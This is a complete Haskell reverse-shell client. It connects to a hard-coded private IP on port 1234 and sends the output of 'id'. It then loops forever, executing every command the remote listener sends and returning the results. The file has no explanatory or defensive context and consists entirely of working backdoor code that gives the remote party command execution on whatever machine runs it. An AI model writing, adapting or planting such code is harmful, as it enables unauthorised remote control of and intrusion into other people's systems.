import Network.Socket hiding (send, sendTo, recv, recvFrom)
import Network.Socket.ByteString (send, recv)
import qualified Data.ByteString.Char8 as B8
import System.Process
import System.IO
import Data.List.Split

main = do
        client "192.168.126.128" 1234

client :: String -> Int -> IO ()
client host port = withSocketsDo $ do
                addrInfo <- getAddrInfo Nothing (Just host) (Just $ show port)
                let serverAddr = head addrInfo
                sock <- socket (addrFamily serverAddr) Stream defaultProtocol
                connect sock (addrAddress serverAddr)
                (_, Just hout, _, _) <- createProcess (proc "id" []) {std_out = CreatePipe}
                resultOut <- hGetContents hout
                let resultMsg = B8.pack resultOut
                send sock resultMsg
                msgSender sock
                sClose sock

msgSender :: Socket -> IO ()
msgSender sock = do
  let msg = B8.pack ""
  send sock msg
  rMsg <- recv sock 1024
  let split_cmd = splitOn " " (filter (/= '\n') (B8.unpack rMsg))
  (_, Just hout, _, _) <- createProcess (proc (head split_cmd) (tail split_cmd)) {std_out = CreatePipe}
  resultOut <- hGetContents hout
  let resultMsg = B8.pack resultOut
  send sock resultMsg
  msgSender sock
